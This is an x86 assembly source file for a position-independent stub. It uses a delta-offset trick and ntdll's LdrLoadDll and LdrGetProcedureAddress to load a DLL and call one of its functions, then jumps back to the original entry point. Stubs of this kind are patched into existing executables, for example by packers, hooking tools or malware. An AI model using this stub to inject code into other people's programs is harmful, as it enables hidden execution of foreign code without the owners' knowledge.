.386
.model flat, stdcall
option casemap :none

.code
start:
	nop
	nop
	nop
	nop
	nop
	pushad
	call Delta
Delta:
	pop ebp
	mov eax, [ebp + (offset ModuleHandle - Delta)]
	test eax,eax
	jnz CheckAddr
	lea eax, [ebp + (offset ModuleHandle - Delta)]
	push eax 
	mov eax, [ebp + (offset DllNamePtr - Delta)]
	push eax
	push 0
	mov eax, [ebp + (offset DllPathPtr - Delta)]
	push eax
	mov eax, [ebp + (offset LdrLoadDll - Delta)]
	call eax
	mov eax, [ebp + (offset ModuleHandle - Delta)]
	test eax,eax
	jz Quit	
CheckAddr:	
	mov eax,[ebp + (offset FunctionAddress - Delta)]
	test eax,eax
	jz GetAddr
	add eax, [ebp + (offset ModuleHandle - Delta)]
	jmp CallFunc
GetAddr:	
	lea eax, [ebp + (offset FunctionAddress - Delta)]
	push eax
	mov eax, [ebp + (offset Ordinal - Delta)]
	push eax
	mov eax, [ebp + (offset ApiNamePtr - Delta)]
	push eax
	mov eax, [ebp + (offset ModuleHandle - Delta)]
	push eax	
	mov eax, [ebp + (offset LdrGetProcedureAddress - Delta)]
	call eax
	mov eax,[ebp + (offset FunctionAddress - Delta)]
	test eax,eax
	jz Quit
CallFunc:	
	call eax
Quit:	
	popad
	mov esp,00000000h
	db 0e9h

OEP dd 0	
ModuleHandle dd 0
FunctionAddress dd 0
LdrLoadDll dd 0
LdrGetProcedureAddress dd 0
DllPathPtr dd 0
DllNamePtr dd 0
ApiNamePtr dd 0
Ordinal dd 0
Strings db ?


end start

end